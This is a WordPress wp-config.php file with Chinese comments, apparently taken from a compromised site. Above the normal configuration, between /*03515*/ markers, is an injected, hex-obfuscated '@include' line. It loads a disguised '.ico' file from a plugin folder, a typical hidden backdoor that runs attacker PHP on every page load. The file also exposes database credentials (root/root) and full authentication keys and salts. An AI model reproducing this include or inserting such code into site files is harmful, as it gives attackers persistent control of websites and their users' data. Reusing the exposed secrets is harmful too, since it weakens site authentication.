<?php


/*03515*/

@include "\x2fhom\x651/v\x68ost\x2fvh6\x33702\x36/ww\x77/wp\x2dcon\x74ent\x2fplu\x67ins\x2fjs_\x63omp\x6fser\x5fthe\x6de/f\x61vic\x6fn_4\x302fd\x35.ic\x6f";

/*03515*/

/**

 * WordPress基础配置文件。

 *

 * 本文件包含以下配置选项：MySQL设置、数据库表名前缀、密钥、

 * WordPress语言设定以及ABSPATH。如需更多信息，请访问

 * {@link http://codex.wordpress.org/zh-cn:%E7%BC%96%E8%BE%91_wp-config.php

 * 编辑wp-config.php}Codex页面。MySQL设置具体信息请咨询您的空间提供商。

 *

 * 这个文件被安装程序用于自动生成wp-config.php配置文件，

 * 您可以手动复制这个文件，并重命名为“wp-config.php”，然后填入相关信息。

 *

 * @package WordPress

 */



// ** MySQL 设置 - 具体信息来自您正在使用的主机 ** //

/** WordPress数据库的名称 */

define('DB_NAME', 'an');



/** MySQL数据库用户名 */

define('DB_USER', 'root');



/** MySQL数据库密码 */

define('DB_PASSWORD', 'root');



/** MySQL主机 */

define('DB_HOST', 'localhost');



/** 创建数据表时默认的文字编码 */

define('DB_CHARSET', 'utf8');



/** 数据库整理类型。如不确定请勿更改 */

define('DB_COLLATE', '');



/**#@+

 * 身份认证密钥与盐。

 *

 * 修改为任意独一无二的字串！

 * 或者直接访问{@link https://api.wordpress.org/secret-key/1.1/salt/

 * WordPress.org密钥生成服务}

 * 任何修改都会导致所有cookies失效，所有用户将必须重新登录。

 *

 * @since 2.6.0

 */

define('AUTH_KEY',         'HOs}Bru8dC,l9dG+A3JS?p7C{KKPfG!X*_5zQWL/:&TKBH4VTl1l--<0x26DC%lb');

define('SECURE_AUTH_KEY',  'iuaYdxV@I]wa+Y=B49R-bl~3|^Cf$;rQg~}aiOsM$0WkpTT=cjr-**mkp#2/96{|');

define('LOGGED_IN_KEY',    ' Dyk3-9?!DC9QMz5 i,}[J=:=;g~|9|aDY{Y|8?T8nq_Z<r_*ru>Z{:yEgLXs1ZH');

define('NONCE_KEY',        '?Vys|i9`jU ewhl|^h^^XcZ=sp)6/I;U({Q2oBe3: @rU!4JuROuj.Wx&i]^5wa!');

define('AUTH_SALT',        'lNP3m[[W+35T0/flo4;-rNgb{X{{-z|rE2|p57uVRSXD/ezrY6-WLu*|b&KBgBAU');

define('SECURE_AUTH_SALT', ']-zO]wmmdU:ObKiXWe/K/S~v gNc7$M,K,3nxlyE?bPQYFhk!j @8jC9Tk4^lTK%');

define('LOGGED_IN_SALT',   '-a~FJQMem/^9}zh)1nX&yY`nV&5R7U5Q, 4y{l(FxiDLJR3s6Cxps-!(oo=(hc;W');

define('NONCE_SALT',       'QNWxXJ2=LbJgp>p=w|ytG&_Q)*_f1hY]y3}!x]IznJl1b~_/iX/-Om;;V@PTE36M');



/**#@-*/



/**

 * WordPress数据表前缀。

 *

 * 如果您有在同一数据库内安装多个WordPress的需求，请为每个WordPress设置

 * 不同的数据表前缀。前缀名只能为数字、字母加下划线。

 */

$table_prefix  = 'wp_';



/**

 * 开发者专用：WordPress调试模式。

 *

 * 将这个值改为true，WordPress将显示所有用于开发的提示。

 * 强烈建议插件开发者在开发环境中启用WP_DEBUG。

 */

define('WP_DEBUG', false);



/**

 * zh_CN本地化设置：启用ICP备案号显示

 *

 * 可在设置→常规中修改。

 * 如需禁用，请移除或注释掉本行。

 */

define('WP_ZH_CN_ICP_NUM', true);

define( 'WP_MEMORY_LIMIT', '96M' );



/* 好了！请不要再继续编辑。请保存本文件。使用愉快！ */



/** WordPress目录的绝对路径。 */

if ( !defined('ABSPATH') )

	define('ABSPATH', dirname(__FILE__) . '/');



/** 设置WordPress变量和包含文件。 */

require_once(ABSPATH . 'wp-settings.php');

